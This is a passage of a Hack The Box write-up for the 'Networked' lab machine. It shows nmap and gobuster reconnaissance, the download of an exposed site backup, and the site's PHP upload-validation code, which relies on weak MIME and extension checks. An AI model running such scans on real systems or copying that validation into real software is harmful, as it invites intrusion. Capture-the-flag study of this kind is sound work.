<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1.0, user-scalable=no">

    
      <link rel="icon" href="/favicon.png" />
    

    <title>
        
          Hack The Box - Networked - 0xRick
        
    </title>
    <style>
  #carbonads {
    border: 1px solid black;
    border-radius: 7px;
    border-spacing: 7px;
    display: block;
    overflow: hidden;
    padding: 1em;
    line-height: 1.5;
  }
  #carbonads span {
    position: relative;
    display: block;
    overflow: hidden;
  }
  .carbon-img {
    float: left;
    margin-right: 1em;
  }
  .carbon-img img {
    display: block;
  }
  .carbon-text {
    display: block;
    float: left;
    max-width: calc(100% - 130px - 1em);
    text-align: left;
  }
  .carbon-poweredby {
    position: absolute;
    left: 142px;
    bottom: 0;
    display: block;
    font-size: .8em;
    line-height: 1;
    letter-spacing: 1px;
    }
    </style>
    <!-- Spectre.css framework -->
    <link rel="stylesheet" href="https://unpkg.com/spectre.css/dist/spectre.min.css">
    <link rel="stylesheet" href="https://unpkg.com/spectre.css/dist/spectre-exp.min.css">
    <link rel="stylesheet" href="https://unpkg.com/spectre.css/dist/spectre-icons.min.css">

    <!-- theme css & js -->
    
<link rel="stylesheet" href="/css/book.css">

    
<script src="/js/book.js"></script>


    <!-- tocbot -->
    <script src="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.4.2/tocbot.min.js"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.4.2/tocbot.css">
    
    <!-- katex -->
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">

    
<!-- Google Analytics -->
<script>
(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
})(window,document,'script','https://www.google-analytics.com/analytics.js','ga');

ga('create', 'UA-97164925-2', 'auto');
ga('send', 'pageview');
</script>
<!-- End Google Analytics -->

    
<script src="https://cdnjs.cloudflare.com/ajax/libs/zooming/2.1.1/zooming.min.js"></script>
<script>
document.addEventListener('DOMContentLoaded', function () {
    const zooming = new Zooming()
    zooming.listen('.book-content img')
})
</script>

    <style>
      #htbbadge{
        float: left;
      }
    </style>
<meta name="generator" content="Hexo 4.2.0"><link rel="alternate" href="/feed.xml" title="0xRick" type="application/rss+xml">
</head>

<body>

<div class="book-container">
  <div class="book-sidebar">
    <div class="book-brand">
  <a href="/">
    <img src="/favicon.png">
    <span>0XRICK</span>
  </a>
</div>
    <div class="book-menu">
  <ul>
<li><a href="/">Home</a></li>
</ul>
<h1 id="Categories"><a href="#Categories" class="headerlink" title="Categories"></a>Categories</h1><h2 id="Hack-The-Box-Write-ups"><a href="#Hack-The-Box-Write-ups" class="headerlink" title="Hack The Box Write-ups"></a>Hack The Box Write-ups</h2><ul>
<li><a href="/hack-the-box/ai/">Hack The Box - AI</a></li>
<li><a href="/hack-the-box/player/">Hack The Box - Player</a></li>
<li><a href="/hack-the-box/bitlab/">Hack The Box - Bitlab</a></li>
<li><a href="/hack-the-box/craft/">Hack The Box - Craft</a></li>
<li><a href="/hack-the-box/smasher2/">Hack The Box - Smasher2</a></li>
<li><a href="/hack-the-box/wall/">Hack The Box - Wall</a></li>
<li><a href="/hack-the-box/heist/">Hack The Box - Heist</a></li>
<li><a href="/hack-the-box/chainsaw/">Hack The Box - Chainsaw</a></li>
<li><a href="/hack-the-box/networked/">Hack The Box - Networked</a></li>
<li><a href="/hack-the-box/jarvis/">Hack The Box - Jarvis</a></li>
<li><a href="/hack-the-box/haystack/">Hack The Box - Haystack</a></li>
<li><a href="/hack-the-box/safe/">Hack The Box - Safe</a></li>
<li><a href="/hack-the-box/ellingson/">Hack The Box - Ellingson</a></li>
<li><a href="/hack-the-box/writeup/">Hack The Box - Writeup</a></li>
<li><a href="/hack-the-box/ghoul">Hack The Box - Ghoul</a></li>
<li><a href="/hack-the-box/swagshop/">Hack The Box - Swagshop</a></li>
<li><a href="/hack-the-box/kryptos/">Hack The Box - Kryptos</a></li>
<li><a href="/hack-the-box/luke/">Hack The Box - Luke</a></li>
<li><a href="/hack-the-box/bastion/">Hack The Box - Bastion</a></li>
<li><a href="/hack-the-box/bastion-2/">Hack The Box - Bastion (Commando)</a></li>
<li><a href="/hack-the-box/onetwoseven/">Hack The Box - OneTwoSeven</a></li>
<li><a href="/hack-the-box/unattended/">Hack The Box - Unattended</a></li>
<li><a href="/hack-the-box/helpline/">Hack The Box - Helpline</a></li>
<li><a href="/hack-the-box/arkham/">Hack The Box - Arkham</a></li>
<li><a href="/hack-the-box/fortune">Hack The Box - Fortune</a></li>
<li><a href="/hack-the-box/lacasadepapel/">Hack The Box - LaCasaDePapel</a></li>
<li><a href="/hack-the-box/ctf/">Hack The Box - CTF</a></li>
<li><a href="/c/categories/#Hack-The-Box"><strong>Older</strong></a></li>
</ul>
<h2 id="Wizard-Labs-Write-ups"><a href="#Wizard-Labs-Write-ups" class="headerlink" title="Wizard Labs Write-ups"></a>Wizard Labs Write-ups</h2><ul>
<li><a href="/wizard-labs/devlife/">Wizard Labs - Devlife</a></li>
<li><a href="/wizard-labs/dummy/">wizard Labs - Dummy</a></li>
</ul>
<h2 id="Basic-Binary-Exploitation"><a href="#Basic-Binary-Exploitation" class="headerlink" title="Basic Binary Exploitation"></a>Basic Binary Exploitation</h2><ul>
<li><a href="/binary-exploitation/bof6/">Bof: re2libc - protostar stack6</a></li>
<li><a href="/binary-exploitation/bof5/">Bof: ShellCode Injection - protostar stack5</a></li>
<li><a href="/binary-exploitation/bof4/">Bof: Taking control of the instruction pointer - protostar stack4</a></li>
<li><a href="/binary-exploitation/bof3/">Bof: Overwriting function pointers - protostar stack3</a></li>
<li><a href="/binary-exploitation/bof2/">Bof: Overwriting stack variables - protostar stack1,2</a></li>
<li><a href="/binary-exploitation/bof1/">Buffer Overflow Explained</a></li>
</ul>
<h2 id="Pwn-Challenges-Write-ups"><a href="#Pwn-Challenges-Write-ups" class="headerlink" title="Pwn Challenges Write-ups"></a>Pwn Challenges Write-ups</h2><ul>
<li><a href="/pwn/collision/">pwnable.kr - collision</a></li>
<li><a href="/pwn/bof/">pwnable.kr - bof</a></li>
<li><a href="/pwn/fd/">pwnable.kr - fd</a></li>
</ul>
<h2 id="Misc-CTF-Write-ups"><a href="#Misc-CTF-Write-ups" class="headerlink" title="Misc CTF Write-ups"></a>Misc CTF Write-ups</h2><ul>
<li><a href="/ctfs/egctf-qual/">EGCTF 2019 - Qualification Round</a></li>
</ul>
<h2 id="Lists"><a href="#Lists" class="headerlink" title="Lists"></a>Lists</h2><ul>
<li><a href="/lists/stego/">Steganography</a></li>
</ul>

</div>


<script src="/js/book-menu.js"></script>

  </div>

  <div class="off-canvas-content">
    <div class="columns">
      <div class="column col-10 col-lg-12">
        <div class="book-navbar">
          <!-- For Responsive Layout -->

<header class="navbar">
  <section class="navbar-section">
    <a onclick="open_sidebar()">
      <i class="icon icon-menu"></i>
    </a>
  </section>
</header>

        </div>
        <div class="book-content">
          <div class="book-post">
  <div> <script async type="text/javascript" src="//cdn.carbonads.com/carbon.js?serve=CK7DL23U&placement=0xrickgithubio" id="_carbonads_js"></script> </div> <br>
  <h1 id="Hack-The-Box-Networked"><a href="#Hack-The-Box-Networked" class="headerlink" title="Hack The Box - Networked"></a>Hack The Box - Networked</h1><h2 id="Quick-Summary"><a href="#Quick-Summary" class="headerlink" title="Quick Summary"></a>Quick Summary</h2><p>Hey guys, today Networked retired and here’s my write-up about it. It was a quick fun machine with an <code>RCE</code> vulnerability and a couple of command injection vulnerabilities. It’s a Linux box and its ip is <code>10.10.10.146</code>, I added it to <code>/etc/hosts</code> as <code>networked.htb</code>. Let’s jump right in !<br><img src="/images/hackthebox/networked/0.png" alt=""></p>
<h2 id="Nmap"><a href="#Nmap" class="headerlink" title="Nmap"></a>Nmap</h2><p>As always we will start with <code>nmap</code> to scan for open ports and services:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~&#x2F;Desktop&#x2F;HTB&#x2F;boxes&#x2F;networked# nmap -sV -sT -sC -o nmapinitial networked.htb</span><br><span class="line">Starting Nmap 7.70 ( https:&#x2F;&#x2F;nmap.org ) at 2019-11-16 01:16 EET </span><br><span class="line">Nmap scan report for networked.htb (10.10.10.146)</span><br><span class="line">Host is up (1.7s latency).</span><br><span class="line">Not shown: 997 filtered ports</span><br><span class="line">PORT    STATE  SERVICE VERSION</span><br><span class="line">22&#x2F;tcp  open   ssh     OpenSSH 7.4 (protocol 2.0)</span><br><span class="line">| ssh-hostkey:</span><br><span class="line">|   2048 22:75:d7:a7:4f:81:a7:af:52:66:e5:27:44:b1:01:5b (RSA)</span><br><span class="line">|   256 2d:63:28:fc:a2:99:c7:d4:35:b9:45:9a:4b:38:f9:c8 (ECDSA)</span><br><span class="line">|_  256 73:cd:a0:5b:84:10:7d:a7:1c:7c:61:1d:f5:54:cf:c4 (ED25519)</span><br><span class="line">80&#x2F;tcp  open   http    Apache httpd 2.4.6 ((CentOS) PHP&#x2F;5.4.16)</span><br><span class="line">|_http-server-header: Apache&#x2F;2.4.6 (CentOS) PHP&#x2F;5.4.16</span><br><span class="line">|_http-title: Site doesn&#39;t have a title (text&#x2F;html; charset&#x3D;UTF-8).</span><br><span class="line">443&#x2F;tcp closed https</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https:&#x2F;&#x2F;nmap.org&#x2F;submit&#x2F; .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 147.70 seconds</span><br><span class="line">root@kali:~&#x2F;Desktop&#x2F;HTB&#x2F;boxes&#x2F;networked#</span><br></pre></td></tr></table></figure>
<p>We got <code>ssh</code> on port 22 and <code>http</code> on port 80, let’s check the web service.</p>
<h2 id="Web-Enumeration"><a href="#Web-Enumeration" class="headerlink" title="Web Enumeration"></a>Web Enumeration</h2><p>The index page had nothing except for this message:<br><img src="/images/hackthebox/networked/1.png" alt=""><br>So I ran <code>gobuster</code> to check for sub directories and I found 2 interesting directories, <code>/uploads</code> and <code>/backup</code>:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~&#x2F;Desktop&#x2F;HTB&#x2F;boxes&#x2F;networked# gobuster -u http:&#x2F;&#x2F;networked.htb&#x2F; -w &#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;dirb&#x2F;common.txt                                                                                                </span><br><span class="line"></span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line">Gobuster v2.0.1              OJ Reeves (@TheColonial)</span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line">[+] Mode         : dir</span><br><span class="line">[+] Url&#x2F;Domain   : http:&#x2F;&#x2F;networked.htb&#x2F;</span><br><span class="line">[+] Threads      : 10</span><br><span class="line">[+] Wordlist     : &#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;dirb&#x2F;common.txt</span><br><span class="line">[+] Status codes : 200,204,301,302,307,403</span><br><span class="line">[+] Timeout      : 10s</span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line">2019&#x2F;11&#x2F;16 01:21:45 Starting gobuster</span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line">&#x2F;.hta (Status: 403)</span><br><span class="line">&#x2F;.htpasswd (Status: 403)</span><br><span class="line">&#x2F;.htaccess (Status: 403)</span><br><span class="line">&#x2F;backup (Status: 301)</span><br><span class="line">&#x2F;cgi-bin&#x2F; (Status: 403)</span><br><span class="line">&#x2F;index.php (Status: 200)</span><br><span class="line">&#x2F;uploads (Status: 301)</span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line">2019&#x2F;11&#x2F;16 01:24:26 Finished</span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line">root@kali:~&#x2F;Desktop&#x2F;HTB&#x2F;boxes&#x2F;networked#</span><br></pre></td></tr></table></figure>
<p>In <code>/backup</code> I found a <code>tar</code> archive that had a backup of all the site’s pages:<br><img src="/images/hackthebox/networked/2.png" alt=""></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~&#x2F;Desktop&#x2F;HTB&#x2F;boxes&#x2F;networked# wget http:&#x2F;&#x2F;networked.htb&#x2F;backup&#x2F;backup.tar</span><br><span class="line">--2019-11-16 01:25:13--  http:&#x2F;&#x2F;networked.htb&#x2F;backup&#x2F;backup.tar</span><br><span class="line">Resolving networked.htb (networked.htb)... 10.10.10.146</span><br><span class="line">Connecting to networked.htb (networked.htb)|10.10.10.146|:80... connected.</span><br><span class="line">HTTP request sent, awaiting response... 200 OK</span><br><span class="line">Length: 10240 (10K) [application&#x2F;x-tar]</span><br><span class="line">Saving to: ‘backup.tar’</span><br><span class="line"></span><br><span class="line">backup.tar                                           100%[&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&gt;]  10.00K  --.-KB&#x2F;s    in 0.1s    </span><br><span class="line"></span><br><span class="line">2019-11-16 01:25:13 (95.3 KB&#x2F;s) - ‘backup.tar’ saved [10240&#x2F;10240]</span><br><span class="line"></span><br><span class="line">root@kali:~&#x2F;Desktop&#x2F;HTB&#x2F;boxes&#x2F;networked#</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~&#x2F;Desktop&#x2F;HTB&#x2F;boxes&#x2F;networked# mkdir backup</span><br><span class="line">root@kali:~&#x2F;Desktop&#x2F;HTB&#x2F;boxes&#x2F;networked# cd backup&#x2F;</span><br><span class="line">root@kali:~&#x2F;Desktop&#x2F;HTB&#x2F;boxes&#x2F;networked&#x2F;backup# mv ..&#x2F;backup.tar .</span><br><span class="line">root@kali:~&#x2F;Desktop&#x2F;HTB&#x2F;boxes&#x2F;networked&#x2F;backup# tar xvf backup.tar </span><br><span class="line">index.php</span><br><span class="line">lib.php</span><br><span class="line">photos.php</span><br><span class="line">upload.php</span><br><span class="line">root@kali:~&#x2F;Desktop&#x2F;HTB&#x2F;boxes&#x2F;networked&#x2F;backup# ls -la</span><br><span class="line">total 36</span><br><span class="line">drwxr-xr-x 2 root root  4096 Nov 16 01:26 .</span><br><span class="line">drwxr-xr-x 3 root root  4096 Nov 16 01:25 ..</span><br><span class="line">-rw-r--r-- 1 root root 10240 Jul  9 13:33 backup.tar</span><br><span class="line">-rw-r--r-- 1 root root   229 Jul  9 13:33 index.php</span><br><span class="line">-rw-r--r-- 1 root root  2001 Jul  2 13:38 lib.php</span><br><span class="line">-rw-r--r-- 1 root root  1871 Jul  2 14:53 photos.php</span><br><span class="line">-rw-r--r-- 1 root root  1331 Jul  2 14:45 upload.php</span><br><span class="line">root@kali:~&#x2F;Desktop&#x2F;HTB&#x2F;boxes&#x2F;networked&#x2F;backup#</span><br></pre></td></tr></table></figure>
<p><code>index.php</code>:</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">Hello mate, we're building the new FaceMash!<span class="tag">&lt;/<span class="name">br</span>&gt;</span></span><br><span class="line">Help by funding us and be the new Tyler&amp;Cameron!<span class="tag">&lt;/<span class="name">br</span>&gt;</span></span><br><span class="line">Join us at the pool party this Sat to get a glimpse</span><br><span class="line"><span class="comment">&lt;!-- upload and gallery not yet linked --&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p><code>lib.php</code>:</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getnameCheck</span><span class="params">($filename)</span> </span>&#123;</span><br><span class="line">  $pieces = explode(<span class="string">'.'</span>,$filename);</span><br><span class="line">  $name= array_shift($pieces);</span><br><span class="line">  $name = str_replace(<span class="string">'_'</span>,<span class="string">'.'</span>,$name);</span><br><span class="line">  $ext = implode(<span class="string">'.'</span>,$pieces);</span><br><span class="line">  <span class="comment">#echo "name $name - ext $ext\n";</span></span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">array</span>($name,$ext);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getnameUpload</span><span class="params">($filename)</span> </span>&#123;</span><br><span class="line">  $pieces = explode(<span class="string">'.'</span>,$filename);</span><br><span class="line">  $name= array_shift($pieces);</span><br><span class="line">  $name = str_replace(<span class="string">'_'</span>,<span class="string">'.'</span>,$name);</span><br><span class="line">  $ext = implode(<span class="string">'.'</span>,$pieces);</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">array</span>($name,$ext);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check_ip</span><span class="params">($prefix,$filename)</span> </span>&#123;</span><br><span class="line">  <span class="comment">//echo "prefix: $prefix - fname: $filename\n";</span></span><br><span class="line">  $ret = <span class="keyword">true</span>;</span><br><span class="line">  <span class="keyword">if</span> (!(filter_var($prefix, FILTER_VALIDATE_IP))) &#123;</span><br><span class="line">    $ret = <span class="keyword">false</span>;</span><br><span class="line">    $msg = <span class="string">"4tt4ck on file "</span>.$filename.<span class="string">": prefix is not a valid ip "</span>;</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    $msg = $filename;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">array</span>($ret,$msg);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">file_mime_type</span><span class="params">($file)</span> </span>&#123;</span><br><span class="line">  $regexp = <span class="string">'/^([a-z\-]+\/[a-z0-9\-\.\+]+)(;\s.+)?$/'</span>;</span><br><span class="line">  <span class="keyword">if</span> (function_exists(<span class="string">'finfo_file'</span>)) &#123;</span><br><span class="line">    $finfo = finfo_open(FILEINFO_MIME);</span><br><span class="line">    <span class="keyword">if</span> (is_resource($finfo)) <span class="comment">// It is possible that a FALSE value is returned, if there is no magic MIME database file found on the system</span></span><br><span class="line">    &#123;</span><br><span class="line">      $mime = @finfo_file($finfo, $file[<span class="string">'tmp_name'</span>]);</span><br><span class="line">      finfo_close($finfo);</span><br><span class="line">      <span class="keyword">if</span> (is_string($mime) &amp;&amp; preg_match($regexp, $mime, $matches)) &#123;</span><br><span class="line">        $file_type = $matches[<span class="number">1</span>];</span><br><span class="line">        <span class="keyword">return</span> $file_type;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> (function_exists(<span class="string">'mime_content_type'</span>))</span><br><span class="line">  &#123;</span><br><span class="line">    $file_type = @mime_content_type($file[<span class="string">'tmp_name'</span>]);</span><br><span class="line">    <span class="keyword">if</span> (strlen($file_type) &gt; <span class="number">0</span>) <span class="comment">// It's possible that mime_content_type() returns FALSE or an empty string</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">return</span> $file_type;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> $file[<span class="string">'type'</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check_file_type</span><span class="params">($file)</span> </span>&#123;</span><br><span class="line">  $mime_type = file_mime_type($file);</span><br><span class="line">  <span class="keyword">if</span> (strpos($mime_type, <span class="string">'image/'</span>) === <span class="number">0</span>) &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">  &#125;  </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">displayform</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;form action=<span class="string">"&lt;?php echo $_SERVER['PHP_SELF']; ?&gt;"</span> method=<span class="string">"post"</span> enctype=<span class="string">"multipart/form-data"</span>&gt;</span><br><span class="line"> &lt;input type=<span class="string">"file"</span> name=<span class="string">"myFile"</span>&gt;</span><br><span class="line"> </span><br><span class="line">&lt;input type=<span class="string">"submit"</span> name=<span class="string">"submit"</span> value=<span class="string">"go!"</span>&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p><code>photos.php</code>:</p>
